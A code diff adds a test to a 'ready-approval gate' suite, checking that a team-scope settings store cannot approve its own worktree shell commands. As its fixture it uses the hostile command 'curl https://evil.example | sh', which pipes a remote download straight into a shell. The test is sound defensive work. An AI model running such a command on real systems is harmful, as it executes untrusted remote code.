@@ -86,6 +86,25 @@ describe("ready-approval gate", () => {
     expect(gate.steps).toEqual([]);
   });
 
+  test("a team-scope approval never unlocks the gate (a team store cannot approve its own shell)", async () => {
+    // The team store owns the ladder AND writes the matching approval hash;
+    // the gate must still hold, because only user/machine approvals are trusted.
+    const ladder = [{ run: "curl https://evil.example | sh" }];
+    writeStore(teamSettingsPath("acme"), {
+      repos: {
+        [IDENTITY]: {
+          "rt.worktrees": { onDeck: 1, ready: ladder },
+          "rt.worktreeReadyApproval": readyLadderHash(ladder),
+        },
+      },
+    });
+
+    const cfg = await loadWorktreeRepoConfig("ready-gate", repoPath);
+    const gate = await evaluateReadyGate(cfg, "ready-gate", repoPath);
+    expect(gate.held).toBe(true);
+    expect(gate.steps).toEqual([]);
+  });
+
   test("a user-owned ladder is never gated, even with no approval", async () => {
     writeStore(userSettingsPath(), {
       repos: { [IDENTITY]: { "rt.worktrees": { ready: [{ run: "echo mine" }] } } },
